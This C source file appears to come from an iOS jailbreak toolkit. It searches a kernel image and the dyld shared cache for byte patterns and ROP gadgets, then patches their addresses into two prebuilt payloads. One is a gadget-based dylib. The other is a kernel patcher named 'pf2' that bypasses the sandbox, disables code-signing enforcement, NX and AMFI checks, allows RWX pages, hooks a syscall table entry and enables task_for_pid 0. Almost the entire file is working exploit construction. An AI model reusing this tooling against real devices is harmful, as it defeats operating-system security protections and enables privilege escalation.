#include "common.h"
#include "binary.h"
#define max(a, b) ((a) > (b) ? (a) : (b))
#define min(a, b) ((a) < (b) ? (a) : (b))
// Specify align as 0 if you only expect to find it at one place anyway.
addr_t find_data_int(range_t range, int16_t *buf, ssize_t pattern_size, size_t offset, int align, bool must_find, const char *name) {
    int8_t table[256];
    for(int c = 0; c < 256; c++) {
        table[c] = pattern_size;
    }
    for(int pos = 0; pos < pattern_size - 1; pos++) {
        if(buf[pos] == -1) {
            // Unfortunately, we can't put any character past being in this position...
            for(int i = 0; i < 256; i++) {
                table[i] = pattern_size - pos - 1;
            }
        } else {
            table[buf[pos]] = pattern_size - pos - 1;
        }
    }
    // now, for each c, let x be the last position in the string, other than the final position, where c might appear, or -1 if it doesn't appear anywhere; table[i] is size - x - 1.
    // so if we got c but no match, we can skip ahead by table[i]
    // i.e. lame Boyer–Moore
    // I implemented the other half, but it actually made things /slower/
    buf += pattern_size - 1;
    addr_t foundit = 0;
    uint8_t *start = (uint8_t *)addrconv(range.start) + pattern_size - 1;
    uint8_t *end = (uint8_t *)addrconv(range.start + range.size);
    uint8_t *cursor = start;
    while(cursor < end) {
        for(int i = 0; i >= (-pattern_size + 1); i--) {
            if(buf[i] != -1 && cursor[i] != buf[i]) {
                // Not a match
                goto keep_going;
            }
        }
        // Whoa, we found it
        addr_t new = cursor - start + range.start;
        if(align && (new & (align - 1))) {
            // Just kidding.
            goto keep_going;
        }
        if(foundit) {
            die("find_data_int: Found [%s] multiple times in range: first at %08x then at %08x\n", name, foundit, new);
        }
        foundit = new;
        if(align) {
            break;
        }
        // otherwise, keep searching to make sure we won't find it again
        keep_going:;
        int jump = table[*cursor];
        cursor += jump;
    }
    if(foundit) {
        return foundit + offset;
    } else if(must_find) {
        die("find_data_int: Didn't find [%s] in range (%x, %zx)\n", name, range.start, range.size);
    } else {
        return 0;
    }
}

addr_t find_data(range_t range, char *to_find, int align, bool must_find) {
#ifdef PROFILING
    clock_t a = clock();
#endif
    int16_t buf[128];
    size_t pattern_size = 0;
    size_t offset = -1;
    char *to_find_ = strdup(to_find);
    while(to_find_) {
        char *bit = strsep(&to_find_, " ");
        if(!strcmp(bit, "-")) {
            offset = pattern_size; 
            continue;
        } else if(!strcmp(bit, "+")) {
            offset = pattern_size + 1;
            continue;
        } else if(!strcmp(bit, "..")) {
            buf[pattern_size] = -1;
        } else {
            char *endptr;
            buf[pattern_size] = (int16_t) (strtol(bit, &endptr, 16) & 0xff);
            if(*endptr) {
                die("find_data: invalid bit %s in [%s]\n", bit, to_find);
            }
        }
        if(++pattern_size >= 128) {
            die("find_data: pattern [%s] too big\n", to_find);
        }
    }
    free(to_find_);
    if(offset == -1) {
        die("find_data: pattern [%s] doesn't have an offset\n", to_find);
    }
    addr_t result = find_data_int(range, buf, pattern_size, offset, align, must_find, to_find);
#ifdef PROFILING
    clock_t b = clock();
    printf("find_data [%s] took %d/%d\n", to_find, (int)(b - a), (int)CLOCKS_PER_SEC);
#endif
    return result;
}

addr_t find_string(range_t range, const char *string, int align, bool must_find) {
    size_t len = strlen(string);
    int16_t *buf = malloc(sizeof(int16_t) * (len + 2));
    buf[0] = buf[len + 1] = 0;
    for(int i = 0; i < len; i++) {
        buf[i+1] = (uint8_t) string[i];
    }
    addr_t result = find_data_int(range, buf, len, 1, align, must_find, string);
    free(buf);
    return result;
}

addr_t find_int32(range_t range, uint32_t number, bool must_find) {
    char *start = addrconv(range.start);
    char *end = addrconv(range.start + range.size - 4);
    for(char *p = start; p < end; p++) {
        if(*((uint32_t *)p) == number) {
            return p - start + range.start;
        }
    }
    if(must_find) {
        die("find_int32: Didn't find %08x in range\n", number);
    } else {
        return 0;
    }
}

void preplace32(prange_t range, uint32_t a, uint32_t b) {
    bool found_it = false;
    for(paddr_t addr = (paddr_t)range.start; addr + sizeof(uint32_t) <= (paddr_t)range.start + range.size; addr++) {
        if(*(uint32_t *)addr == a) {
            *(uint32_t *)addr = b;
            found_it = true;
        }
    }
    if(!found_it) {
        fprintf(stderr, "preplace32: warning: didn't find %08x anywhere\n", a);
    }
}

prange_t pdup(prange_t range) {
    void *buf = malloc(range.size);
    memcpy(buf, range.start, range.size);
    return (prange_t) {buf, range.size};
}

addr_t find_bof(range_t range, addr_t eof, bool is_thumb) {
    // push {..., lr}; add r7, sp, ...
    addr_t addr = (eof - 1) & ~1;
    check_range_has_addr(range, addr);
    if(is_thumb) {
        // xx b5 xx af
        while(!(read8(addr + 1) == 0xb5 && \
                read8(addr + 3) == 0xaf)) {
            addr -= 2;
            check_range_has_addr(range, addr);
        }
    } else {
        // xx xx 2d e9 xx xx 8d e2
        while(!(read16(addr + 2) == 0xe92d && \
                read16(addr + 6) == 0xe28d)) {
            addr -= 4;
            check_range_has_addr(range, addr);
        }
    }
    return addr;
}

addr_t dyld_find_anywhere(char *to_find, int align) {
    range_t range;
    for(int i = 0; (range = dyld_nth_segment(i)).start; i++) {
        addr_t result = find_data(range, to_find, align, false);
        if(result) return result;
    }
    die("dyld_find_anywhere: Didn't find [%s] /anywhere/\n", to_find);
}

// --

uint32_t find_dvp_struct_offset() {
    range_t range = macho_segrange("__PRELINK_TEXT");
    addr_t derive_vnode_path = find_bof(range, find_int32(range, find_string(range, "path", 0, true), true), true);
    switch(read8(find_data((range_t){derive_vnode_path, 1024}, "- .. 69 6a 46", 0, true))) {
    case 0x20:
        return 0x10;
    case 0x60:
        return 0x14;
    default:
        die("couldn't find dvp_struct_offset\n");
        abort();
    }
}

void write_range(prange_t range, const char *fn, mode_t mode) {
    int fd = open(fn, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if(fd == -1) {
        edie("write_range: could not open %s: %s\n", fn);
    }
    if(write(fd, range.start, range.size) != range.size) {
        edie("write_range: could not write data to %s: %s\n", fn);
    }
    close(fd);
}

prange_t bar() {
    prange_t the_dylib = pdup((prange_t) {one_bin, one_bin_len});    
    // hexydec
    preplace32(the_dylib, 0xfeed0002, dyld_find_anywhere("+ 54 f8 20 00", 2));
    preplace32(the_dylib, 0xfeed0003, dyld_find_anywhere("+ 00 f0 01 00 80 bd", 2));
    preplace32(the_dylib, 0xfeed0004, dyld_find_anywhere("+ 00 68 b0 bd", 2));
    preplace32(the_dylib, 0xfeed0005, dyld_find_anywhere("+ 20 60 90 bd", 2));
    preplace32(the_dylib, 0xfeed0006, dyld_find_anywhere("+ 20 44 90 bd", 2));
    preplace32(the_dylib, 0xfeed0007, dyld_find_anywhere("+ 0f bd", 2));
    preplace32(the_dylib, 0xfeed0009, dyld_find_anywhere("+ 0e bd", 2));
    preplace32(the_dylib, 0xfeed0010, dyld_find_anywhere("+ a7 f1 00 0d 80 bd", 2));
    preplace32(the_dylib, 0xfeed0011, dyld_find_anywhere("+ f0 bd", 2));
    preplace32(the_dylib, 0xfeed0012, dyld_find_anywhere("+ a0 47 b0 bd", 2));
    preplace32(the_dylib, 0xfeed0014, dyld_find_anywhere("+ 20 58 90 bd", 2));
    preplace32(the_dylib, 0xfeed0015, dyld_find_anywhere("+ 40 f8 04 4b 90 bd", 2));
    preplace32(the_dylib, 0xfeed0016, dyld_find_anywhere("+ 20 68 90 bd", 2));
    preplace32(the_dylib, 0xfeed0017, dyld_find_anywhere("+ 25 60 b0 bd", 2));
    preplace32(the_dylib, 0xfeed0018, dyld_find_anywhere("+ 10 bd", 2));
    preplace32(the_dylib, 0xfeed0019, dyld_find_anywhere("+ 80 bd", 2));
    preplace32(the_dylib, 0xdeadfeed, dyld_find_anywhere("- 00 a0 9b 49", 4));
    dyld_choose_file("/usr/lib/libSystem.B.dylib");
    macho_load_symbols();
    preplace32(the_dylib, 0xfeed1001, sym("_sysctlbyname", true));
    preplace32(the_dylib, 0xfeed1002, sym("_execve", true));
    return the_dylib;
}

prange_t foo() {
    prange_t pf2 = pdup((prange_t) {pf2_bin, pf2_bin_len});

    // sandbox
    range_t range = macho_segrange("__PRELINK_TEXT");
    addr_t sb_evaluate = find_bof(range, find_int32(range, find_string(range, "bad opcode", false, true), true), true);
    preplace32(pf2, 0xfeed0001, read32(sb_evaluate));
    preplace32(pf2, 0xfeed0002, read32(sb_evaluate + 4));
    preplace32(pf2, 0xfeed0003, sb_evaluate + 9);
    preplace32(pf2, 0xfeed0004, sym("_memcmp", true));
    preplace32(pf2, 0xfeed0005, sym("_vn_getpath", true));
    preplace32(pf2, 0xfeed0006, find_dvp_struct_offset());
    
    // cs_enforcement_disable
    preplace32(pf2, 0xfedd0001, find_data(macho_segrange("__DATA"), "00 00 00 00 00 00 00 - 00 00 00 00 01 00 00 00 80", 1, true));
    // kernel_pmap->nx_enabled
    preplace32(pf2, 0xfedd0002, sym("_kernel_pmap", false) + 0x420);
    addr_t sysent = find_data(macho_segrange("__DATA"), "21 00 00 00 00 10 86 00 -", 0, true);
    preplace32(pf2, 0xfedd0004, sysent + 4);
    addr_t sysent_patch_orig = read32(sysent + 4);
    preplace32(pf2, 0xfedd0005, sysent_patch_orig);
    // target_addr
    printf("sysent_patch_orig = %x %x\n", sysent, sysent_patch_orig);
    preplace32(pf2, 0xfedd0006, (sysent_patch_orig & 0x00ffffff) | 0x2f000000);
    // vm_map_enter (patch1) - allow RWX pages
    preplace32(pf2, 0xfedd0007, find_data(macho_segrange("__TEXT"), "- 02 0f .. .. 63 08 03 f0 01 05 e3 0a 13 f0 01 03 1e 93", 0, true));
    // AMFI (patch3) - disable the predefined list of executable stuff
    preplace32(pf2, 0xfedd0008, find_data(macho_segrange("__PRELINK_TEXT"), "23 78 9c 45 05 d1 .. .. .. .. .. .. .. 4b 98 47 00 .. -", 1, true));
    // task_for_pid 0
    preplace32(pf2, 0xfedd0009, find_data(macho_segrange("__TEXT"), "85 68 00 23 .. 93 .. 93 - .. .. .. .. 29 46 04 22", 0, true));
    preplace32(pf2, 0xfedd0010, sym("_flush_dcache", true));
    preplace32(pf2, 0xfedd0011, sym("_invalidate_icache", true));
    preplace32(pf2, 0xfedd0012, sym("_copyin", true));
    preplace32(pf2, 0xfedd0013, sym("_IOLog", true));
    preplace32(pf2, 0xfedd0014, sym("_kalloc", true));
    preplace32(pf2, 0xfedd0015, sb_evaluate);
    return pf2;
}

int main(int argc, char **argv) {
    if(argc <= 1 || argv[1][0] != '-') goto usage;
    switch(argv[1][1]) {
    case 'C':
        load_dyld_cache(argv[2], true);
        write_range(bar(), "libgmalloc.dylib", 0644);
        return 0;
    case 'c':
        load_dyld_cache(argv[2], false);
        write_range(bar(), "libgmalloc.dylib", 0644);
        return 0;
    case 'k':
        load_macho(argv[2]);
        write_range(foo(), "pf2", 0755);
        return 0;
    case 'K':
        load_running_kernel();  
        write_range(foo(), "pf2", 0755);
        return 0;
    }
    usage:
    fprintf(stderr, "Usage: data -c cache | -k kernel | -C cache | -K\n");
    return 1;
}
